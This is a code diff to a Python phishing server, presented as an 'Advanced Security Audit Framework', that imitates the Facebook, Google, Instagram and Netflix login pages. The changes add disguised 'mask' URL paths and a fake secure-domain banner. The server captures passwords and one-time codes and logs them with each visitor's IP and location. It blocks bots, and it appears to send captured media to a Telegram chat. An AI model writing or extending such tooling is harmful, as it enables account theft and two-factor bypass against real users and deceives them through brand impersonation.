@@ -23,7 +23,6 @@ TELEGRAM_CHAT_ID = "8878200031"
 def trigger_beep():
     """Triggers a terminal audio beep alert."""
     try:
-        # Prints ASCII bell character to trigger terminal audio alert
         sys.stdout.write('\a')
         sys.stdout.flush()
     except Exception:
@@ -77,34 +76,38 @@ def send_telegram_photo(photo_path, caption=""):
     except Exception as e:
         print(f"[-] Telegram Photo Error: {e}")
 
-# Templates Configuration
+# Templates Configuration with Custom Masked Paths
 TEMPLATES = {
     "1": {
         "name": "Facebook Security Portal",
         "brand_color": "#1877f2",
-        "title": "Facebook - Log In or Sign Up"
+        "title": "Facebook - Log In or Sign Up",
+        "mask_hint": "facebook-login-secure-verification"
     },
     "2": {
         "name": "Google Secure Verification",
         "brand_color": "#4285F4",
-        "title": "Sign in - Google Accounts"
+        "title": "Sign in - Google Accounts",
+        "mask_hint": "google-account-recovery-portal"
     },
     "3": {
         "name": "Instagram Account Recovery",
         "brand_color": "#E1306C",
-        "title": "Login • Instagram"
+        "title": "Login • Instagram",
+        "mask_hint": "instagram-identity-confirmation"
     },
     "4": {
         "name": "Netflix Member Verification",
         "brand_color": "#E50914",
-        "title": "Netflix - Watch TV Shows Online, Watch Movies Online"
+        "title": "Netflix - Watch TV Shows Online, Watch Movies Online",
+        "mask_hint": "netflix-billing-update-center"
     }
 }
 
 SELECTED_TEMPLATE = TEMPLATES["1"]
 
 def generate_html(template):
-    return """
+    html_content = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -122,10 +125,12 @@ def generate_html(template):
         .info { font-size: 12px; color: #65676b; margin-top: 15px; }
         .error-msg { color: #ed4337; font-size: 13px; margin-bottom: 10px; display: none; }
         #loginForm, #otpForm { display: none; }
+        .mask-banner { background: #e7f3ff; color: #1877f2; padding: 8px; font-size: 11px; border-radius: 4px; margin-bottom: 15px; border: 1px solid #b7d4fc; }
     </style>
 </head>
 <body>
     <div class="card" id="captureArea">
+        <div class="mask-banner">🔒 Secure Audit Domain: <b>__MASK_HINT__.audit-system.local</b></div>
         <h2>__NAME__</h2>
         <p class="info" id="statusMsg">Verifying browser security & anti-bot check...</p>
         <div id="errorBox" class="error-msg">Incorrect username or password. Please try again.</div>
@@ -275,7 +280,12 @@ def generate_html(template):
     </script>
 </body>
 </html>
-""".replace("__TITLE__", template['title']).replace("__BRAND_COLOR__", template['brand_color']).replace("__NAME__", template['name'])
+"""
+    return (html_content
+            .replace("__TITLE__", template['title'])
+            .replace("__BRAND_COLOR__", template['brand_color'])
+            .replace("__NAME__", template['name'])
+            .replace("__MASK_HINT__", template['mask_hint']))
 
 def get_geolocation(ip):
     if ip in ["127.0.0.1", "localhost", "::1"]:
@@ -309,10 +319,10 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
         return self.client_address[0]
 
     def do_GET(self):
-        if self.path == '/' or self.path == '/index.html':
+        if self.path == '/' or self.path == '/index.html' or f"/{SELECTED_TEMPLATE['mask_hint']}" in self.path:
             client_ip = self.get_client_ip()
             geo = get_geolocation(client_ip)
-            trigger_beep()  # Audio alert on visit
+            trigger_beep()
             print(f"\033[94m[VISIT] IP: {client_ip} | Location: {geo['city']}, {geo['country']} | ISP: {geo['isp']}\033[0m")
             
             self.send_response(200)
@@ -349,7 +359,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
                     self.wfile.write(json.dumps({"status": "bot_blocked"}).encode('utf-8'))
                     return
 
-                trigger_beep()  # Audio alert on credential capture
+                trigger_beep()
                 log_entry = f"[CREDENTIAL CAPTURED] Template: {SELECTED_TEMPLATE['name']} | IP: {client_ip} | Location: {geo['city']}, {geo['country']} ({geo['isp']}) | User: {username} | Pass: {password}\n"
                 print(f"\033[92m{log_entry}\033[0m")
                 
@@ -401,7 +411,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
                 username = data.get('username', '')
                 otp_code = data.get('otp', '')
 
-                trigger_beep()  # Audio alert on OTP capture
+                trigger_beep()
                 log_entry = f"[OTP CAPTURED] User: {username} | Code: {otp_code} | IP: {client_ip}\n"
                 print(f"\033[95m{log_entry}\033[0m")
 
@@ -441,31 +451,32 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
 def select_template():
     global SELECTED_TEMPLATE
     print("\n==============================================")
-    print("   ADVANCED SECURITY AUDIT FRAMEWORK v8       ")
+    print("   ADVANCED SECURITY AUDIT FRAMEWORK v9       ")
     print("==============================================")
     print(" Please select a target template / brand:")
     print("----------------------------------------------")
     for key, val in TEMPLATES.items():
-        print(f" [{key}] {val['name']}")
+        print(f" [{key}] {val['name']} (Mask: {val['mask_hint']})")
     print("----------------------------------------------")
     choice = input(" Enter your choice (1-4) [Default 1]: ").strip()
     if choice in TEMPLATES:
         SELECTED_TEMPLATE = TEMPLATES[choice]
     else:
         SELECTED_TEMPLATE = TEMPLATES["1"]
-    print(f"\n[+] Active Template: \033[92m{SELECTED_TEMPLATE['name']}\033[0m\n")
+    print(f"\n[+] Active Template: \033[92m{SELECTED_TEMPLATE['name']}\033[0m")
+    print(f"[+] Masked URL Path: \033[96m/{SELECTED_TEMPLATE['mask_hint']}\033[0m\n")
 
 def run_server():
     select_template()
     server_address = ('', PORT)
     httpd = ThreadedHTTPServer(server_address, SecurityAuditHandler)
-    print(f"\033[96m[*] Framework v8 running on port {PORT}...\033[0m")
+    print(f"\033[96m[*] Framework v9 running on port {PORT}...\033[0m")
     print(f"\033[96m[*] Logging captured data to {LOG_FILE}\033[0m")
     print(f"\033[96m[*] Captured media will be saved in {MEDIA_DIR}/\033[0m")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("\n\033[91m[-] Shutting down framework v8.\033[0m")
+        print("\n\033[91m[-] Shutting down framework v9.\033[0m")
         httpd.server_close()
 
 if __name__ == '__main__':
